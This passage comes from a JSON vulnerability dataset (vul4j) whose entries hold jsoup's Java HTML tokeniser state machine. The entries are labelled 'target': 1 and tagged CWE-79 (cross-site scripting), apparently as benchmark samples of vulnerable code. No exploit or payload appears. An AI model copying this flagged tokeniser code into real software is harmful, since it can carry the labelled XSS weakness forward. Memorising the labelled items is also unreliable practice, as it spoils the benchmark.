t.transition(DoctypePublicIdentifier_singleQuoted);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    BeforeDoctypePublicIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '\"':\n                    // set public id to empty string\n                    t.transition(DoctypePublicIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    // set public id to empty string\n                    t.transition(DoctypePublicIdentifier_singleQuoted);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    DoctypePublicIdentifier_doubleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\"':\n                    t.transition(AfterDoctypePublicIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.publicIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.publicIdentifier.append(c);\n            }\n        }\n    },\n    DoctypePublicIdentifier_singleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\'':\n                    t.transition(AfterDoctypePublicIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.publicIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.publicIdentifier.append(c);\n            }\n        }\n    },\n    AfterDoctypePublicIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BetweenDoctypePublicAndSystemIdentifiers);\n                    break;\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    BetweenDoctypePublicAndSystemIdentifiers {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    AfterDoctypeSystemKeyword {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeDoctypeSystemIdentifier);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n            }\n        }\n    },\n    BeforeDoctypeSystemIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '\"':\n                    // set system id to empty string\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    // set public id to empty string\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    DoctypeSystemIdentifier_doubleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\"':\n                    t.transition(AfterDoctypeSystemIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.systemIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.systemIdentifier.append(c);\n            }\n        }\n    },\n    DoctypeSystemIdentifier_singleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\'':\n                    t.transition(AfterDoctypeSystemIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.systemIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.systemIdentifier.append(c);\n            }\n        }\n    },\n    AfterDoctypeSystemIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.transition(BogusDoctype);\n                    // NOT force quirks\n            }\n        }\n    },\n    BogusDoctype {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    // ignore char\n                    break;\n            }\n        }\n    },\n    CdataSection {\n        void read(Tokeniser t, CharacterReader r) {\n            String data = r.consumeTo(\"]]>\");\n            t.emit(data);\n            r.matchConsume(\"]]>\");\n            t.transition(Data);\n        }\n    };\n\n\n    abstract void read(Tokeniser t, CharacterReader r);\n\n    static final char nullChar = '\\u0000';\n    private static final char[] attributeSingleValueCharsSorted = new char[]{'\\'', '&', nullChar};\n    private static final char[] attributeDoubleValueCharsSorted = new char[]{'\"', '&', nullChar};\n    private static final char[] attributeNameCharsSorted = new char[]{'\\t', '\\n', '\\r', '\\f', ' ', '/', '=', '>', nullChar, '\"', '\\'', '<'};\n\n    private static final char replacementChar = Tokeniser.replacementChar;\n    private static final String replacementStr = String.valueOf(Tokeniser.replacementChar);\n    private static final char eof = CharacterReader.EOF;\n\n    static {\n        Arrays.sort(attributeSingleValueCharsSorted);\n        Arrays.sort(attributeDoubleValueCharsSorted);\n        Arrays.sort(attributeNameCharsSorted);\n    }\n\n    /**\n     * Handles RawtextEndTagName, ScriptDataEndTagName, and ScriptDataEscapedEndTagName. Same body impl, just\n     * different else exit transitions.\n     */\n    private static void handleDataEndTag(Tokeniser t, CharacterReader r, TokeniserState elseTransition) {\n        if (r.matchesLetter()) {\n            String name = r.consumeLetterSequence();\n            t.tagPending.appendTagName(name.toLowerCase());\n            t.dataBuffer.append(name);\n            return;\n        }\n\n        boolean needsExitTransition = false;\n        if (t.isAppropriateEndTagToken() && !r.isEmpty()) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.dataBuffer.append(c);\n                    needsExitTransition = true;\n            }\n        } else {\n            needsExitTransition = true;\n        }\n\n        if (needsExitTransition) {\n            t.emit(\"</\" + t.dataBuffer.toString());\n            t.transition(elseTransition);\n        }\n    }\n\n    private static void handleDataDoubleEscapeTag(Tokeniser t, CharacterReader r, TokeniserState primary, TokeniserState fallback) {\n        if (r.matchesLetter()) {\n            String name = r.consumeLetterSequence();\n            t.dataBuffer.append(name.toLowerCase());\n            t.emit(name);\n            return;\n        }\n\n        char c = r.consume();\n        switch (c) {\n            case '\\t':\n            case '\\n':\n            case '\\r':\n            case '\\f':\n            case ' ':\n            case '/':\n            case '>':\n                if (t.dataBuffer.toString().equals(\"script\"))\n                    t.transition(primary);\n                else\n                    t.transition(fallback);\n                t.emit(c);\n                break;\n            default:\n                r.unconsume();\n                t.transition(fallback);\n        }\n    }\n}\n",
    "target": 1,
    "language": "java",
    "dataset": "vul4j",
    "idx": 200168,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "package org.jsoup.parser;\n\nimport java.util.Arrays;\n\n/**\n * States and transition activations for the Tokeniser.\n */\nenum TokeniserState {\n    Data {\n        // in data state, gather characters until a character reference or tag is found\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '&':\n                    t.advanceTransition(CharacterReferenceInData);\n                    break;\n                case '<':\n                    t.advanceTransition(TagOpen);\n                    break;\n                case nullChar:\n                    t.error(this); // NOT replacement character (oddly?)\n                    t.emit(r.consume());\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeData();\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    CharacterReferenceInData {\n        // from & in data\n        void read(Tokeniser t, CharacterReader r) {\n            char[] c = t.consumeCharacterReference(null, false);\n            if (c == null)\n                t.emit('&');\n            else\n                t.emit(c);\n            t.transition(Data);\n        }\n    },\n    Rcdata {\n        /// handles data in title, textarea etc\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '&':\n                    t.advanceTransition(CharacterReferenceInRcdata);\n                    break;\n                case '<':\n                    t.advanceTransition(RcdataLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeToAny('&', '<', nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    CharacterReferenceInRcdata {\n        void read(Tokeniser t, CharacterReader r) {\n            char[] c = t.consumeCharacterReference(null, false);\n            if (c == null)\n                t.emit('&');\n            else\n                t.emit(c);\n            t.transition(Rcdata);\n        }\n    },\n    Rawtext {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '<':\n                    t.advanceTransition(RawtextLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeToAny('<', nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    ScriptData {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '<':\n                    t.advanceTransition(ScriptDataLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeToAny('<', nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    PLAINTEXT {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeTo(nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    TagOpen {\n        // from < in data\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '!':\n                    t.advanceTransition(MarkupDeclarationOpen);\n                    break;\n                case '/':\n                    t.advanceTransition(EndTagOpen);\n                    break;\n                case '?':\n                    t.advanceTransition(BogusComment);\n                    break;\n                default:\n                    if (r.matchesLetter()) {\n                        t.createTagPending(true);\n                        t.transition(TagName);\n                    } else {\n                        t.error(this);\n                        t.emit('<'); // char that got us here\n                        t.transition(Data);\n                    }\n                    break;\n            }\n        }\n    },\n    EndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.emit(\"</\");\n                t.transition(Data);\n            } else if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.transition(TagName);\n            } else if (r.matches('>')) {\n                t.error(this);\n                t.advanceTransition(Data);\n            } else {\n                t.error(this);\n                t.advanceTransition(BogusComment);\n            }\n        }\n    },\n    TagName {\n        // from < or </ in data, will have start or end tag pending\n        void read(Tokeniser t, CharacterReader r) {\n            // previous TagOpen state did NOT consume, will have a letter char in current\n            //String tagName = r.consumeToAnySorted(tagCharsSorted).toLowerCase();\n            String tagName = r.consumeTagName().toLowerCase();\n            t.tagPending.appendTagName(tagName);\n\n            switch (r.consume()) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar: // replacement\n                    t.tagPending.appendTagName(replacementStr);\n                    break;\n                case eof: // should emit pending tag?\n                    t.eofError(this);\n                    t.transition(Data);\n                // no default, as covered with above consumeToAny\n            }\n        }\n    },\n    RcdataLessthanSign {\n        // from < in rcdata\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('/')) {\n                t.createTempBuffer();\n                t.advanceTransition(RCDATAEndTagOpen);\n            } else if (r.matchesLetter() && t.appropriateEndTagName() != null && !r.containsIgnoreCase(\"</\" + t.appropriateEndTagName())) {\n                // diverge from spec: got a start tag, but there's no appropriate end tag (</title>), so rather than\n                // consuming to EOF; break out here\n                t.tagPending = t.createTagPending(false).name(t.appropriateEndTagName());\n                t.emitTagPending();\n                r.unconsume(); // undo \"<\"\n                t.transition(Data);\n            } else {\n                t.emit(\"<\");\n                t.transition(Rcdata);\n            }\n        }\n    },\n    RCDATAEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.tagPending.appendTagName(Character.toLowerCase(r.current()));\n                t.dataBuffer.append(Character.toLowerCase(r.current()));\n                t.advanceTransition(RCDATAEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(Rcdata);\n            }\n        }\n    },\n    RCDATAEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                String name = r.consumeLetterSequence();\n                t.tagPending.appendTagName(name.toLowerCase());\n                t.dataBuffer.append(name);\n                return;\n            }\n\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    if (t.isAppropriateEndTagToken())\n                        t.transition(BeforeAttributeName);\n                    else\n                        anythingElse(t, r);\n                    break;\n                case '/':\n                    if (t.isAppropriateEndTagToken())\n                        t.transition(SelfClosingStartTag);\n                    else\n                        anythingElse(t, r);\n                    break;\n                case '>':\n                    if (t.isAppropriateEndTagToken()) {\n                        t.emitTagPending();\n                        t.transition(Data);\n                    }\n                    else\n                        anythingElse(t, r);\n                    break;\n                default:\n                    anythingElse(t, r);\n            }\n        }\n\n        private void anythingElse(Tokeniser t, CharacterReader r) {\n            t.emit(\"</\" + t.dataBuffer.toString());\n            r.unconsume();\n            t.transition(Rcdata);\n        }\n    },\n    RawtextLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('/')) {\n                t.createTempBuffer();\n                t.advanceTransition(RawtextEndTagOpen);\n            } else {\n                t.emit('<');\n                t.transition(Rawtext);\n            }\n        }\n    },\n    RawtextEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.transition(RawtextEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(Rawtext);\n            }\n        }\n    },\n    RawtextEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataEndTag(t, r, Rawtext);\n        }\n    },\n    ScriptDataLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.consume()) {\n                case '/':\n                    t.createTempBuffer();\n                    t.transition(ScriptDataEndTagOpen);\n                    break;\n                case '!':\n                    t.emit(\"<!\");\n                    t.transition(ScriptDataEscapeStart);\n                    break;\n                default:\n                    t.emit(\"<\");\n                    r.unconsume();\n                    t.transition(ScriptData);\n            }\n        }\n    },\n    ScriptDataEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.transition(ScriptDataEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(ScriptData);\n            }\n\n        }\n    },\n    ScriptDataEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataEndTag(t, r, ScriptData);\n        }\n    },\n    ScriptDataEscapeStart {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('-')) {\n                t.emit('-');\n                t.advanceTransition(ScriptDataEscapeStartDash);\n            } else {\n                t.transition(ScriptData);\n            }\n        }\n    },\n    ScriptDataEscapeStartDash {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('-')) {\n                t.emit('-');\n                t.advanceTransition(ScriptDataEscapedDashDash);\n            } else {\n                t.transition(ScriptData);\n            }\n        }\n    },\n    ScriptDataEscaped {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.transition(Data);\n                return;\n            }\n\n            switch (r.current()) {\n                case '-':\n                    t.emit('-');\n                    t.advanceTransition(ScriptDataEscapedDash);\n                    break;\n                case '<':\n                    t.advanceTransition(ScriptDataEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                default:\n                    String data = r.consumeToAny('-', '<', nullChar);\n                    t.emit(data);\n            }\n        }\n    },\n    ScriptDataEscapedDash {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.transition(Data);\n                return;\n            }\n\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    t.transition(ScriptDataEscapedDashDash);\n                    break;\n                case '<':\n                    t.transition(ScriptDataEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataEscaped);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedDashDash {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.transition(Data);\n                return;\n            }\n\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    break;\n                case '<':\n                    t.transition(ScriptDataEscapedLessthanSign);\n                    break;\n                case '>':\n                    t.emit(c);\n                    t.transition(ScriptData);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataEscaped);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTempBuffer();\n                t.dataBuffer.append(Character.toLowerCase(r.current()));\n                t.emit(\"<\" + r.current());\n                t.advanceTransition(ScriptDataDoubleEscapeStart);\n            } else if (r.matches('/')) {\n                t.createTempBuffer();\n                t.advanceTransition(ScriptDataEscapedEndTagOpen);\n            } else {\n                t.emit('<');\n                t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.tagPending.appendTagName(Character.toLowerCase(r.current()));\n                t.dataBuffer.append(r.current());\n                t.advanceTransition(ScriptDataEscapedEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataEndTag(t, r, ScriptDataEscaped);\n        }\n    },\n    ScriptDataDoubleEscapeStart {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataDoubleEscapeTag(t, r, ScriptDataDoubleEscaped, ScriptDataEscaped);\n        }\n    },\n    ScriptDataDoubleEscaped {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.current();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    t.advanceTransition(ScriptDataDoubleEscapedDash);\n                    break;\n                case '<':\n                    t.emit(c);\n                    t.advanceTransition(ScriptDataDoubleEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    String data = r.consumeToAny('-', '<', nullChar);\n                    t.emit(data);\n            }\n        }\n    },\n    ScriptDataDoubleEscapedDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscapedDashDash);\n                    break;\n                case '<':\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataDoubleEscaped);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscaped);\n            }\n        }\n    },\n    ScriptDataDoubleEscapedDashDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    break;\n                case '<':\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscapedLessthanSign);\n                    break;\n                case '>':\n                    t.emit(c);\n                    t.transition(ScriptData);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataDoubleEscaped);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscaped);\n            }\n        }\n    },\n    ScriptDataDoubleEscapedLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('/')) {\n                t.emit('/');\n                t.createTempBuffer();\n                t.advanceTransition(ScriptDataDoubleEscapeEnd);\n            } else {\n                t.transition(ScriptDataDoubleEscaped);\n            }\n        }\n    },\n    ScriptDataDoubleEscapeEnd {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataDoubleEscapeTag(t,r, ScriptDataEscaped, ScriptDataDoubleEscaped);\n        }\n    },\n    BeforeAttributeName {\n        // from tagname <xxx\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break; // ignore whitespace\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.newAttribute();\n                    r.unconsume();\n                    t.transition(AttributeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                case '=':\n                    t.error(this);\n                    t.tagPending.newAttribute();\n                    t.tagPending.appendAttributeName(c);\n                    t.transition(AttributeName);\n                    break;\n                default: // A-Z, anything else\n                    t.tagPending.newAttribute();\n                    r.unconsume();\n                    t.transition(AttributeName);\n            }\n        }\n    },\n    AttributeName {\n        // from before attribute name\n        void read(Tokeniser t, CharacterReader r) {\n            String name = r.consumeToAnySorted(attributeNameCharsSorted);\n            t.tagPending.appendAttributeName(name.toLowerCase());\n\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(AfterAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '=':\n                    t.transition(BeforeAttributeValue);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeName(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                    t.error(this);\n                    t.tagPending.appendAttributeName(c);\n                // no default, as covered in consumeToAny\n            }\n        }\n    },\n    AfterAttributeName {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    // ignore\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '=':\n                    t.transition(BeforeAttributeValue);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeName(replacementChar);\n                    t.transition(AttributeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                    t.error(this);\n                    t.tagPending.newAttribute();\n                    t.tagPending.appendAttributeName(c);\n                    t.transition(AttributeName);\n                    break;\n                default: // A-Z, anything else\n                    t.tagPending.newAttribute();\n                    r.unconsume();\n                    t.transition(AttributeName);\n            }\n        }\n    },\n    BeforeAttributeValue {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    // ignore\n                    break;\n                case '\"':\n                    t.transition(AttributeValue_doubleQuoted);\n                    break;\n                case '&':\n                    r.unconsume();\n                    t.transition(AttributeValue_unquoted);\n                    break;\n                case '\\'':\n                    t.transition(AttributeValue_singleQuoted);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    t.transition(AttributeValue_unquoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case '<':\n                case '=':\n                case '`':\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(c);\n                    t.transition(AttributeValue_unquoted);\n                    break;\n                default:\n                    r.unconsume();\n                    t.transition(AttributeValue_unquoted);\n            }\n        }\n    },\n    AttributeValue_doubleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            String value = r.consumeToAnySorted(attributeDoubleValueCharsSorted);\n            if (value.length() > 0)\n                